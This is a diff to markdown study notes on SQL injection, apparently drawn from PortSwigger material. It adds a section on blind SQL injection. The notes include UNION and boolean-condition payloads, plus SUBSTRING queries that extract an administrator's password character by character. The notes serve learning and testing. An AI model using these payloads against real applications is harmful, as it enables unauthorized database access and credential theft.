@@ -84,3 +84,22 @@
 - You can retrieve multiple values together within this single column by concatenating the values together
 - `' UNION SELECT username || '~' || password FROM users--`
   - https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+## Blind SQL Injection
+- Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
+
+### Exploiting blind SQL injection by triggering conditional responses
+- `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
+  - …xyz' AND '1'='1
+    - The query to return results, because the injected `AND '1'='1` condition is true. As a result, the "Welcome back" message is displayed. 
+  - …xyz' AND '1'='2
+    - The query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
+- Extract data one piece at a time
+  - `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
+    - This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`
+  - `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`
+    -  This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.
+  - `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`
+    - ... Confirm that the first character of the password is `s`
+  - We can continue this process to systematically determine the full password for the Administrator user.
+- `SUBSTRING` is called `SUBSTR` on some types of database (https://portswigger.net/web-security/sql-injection/cheat-sheet)
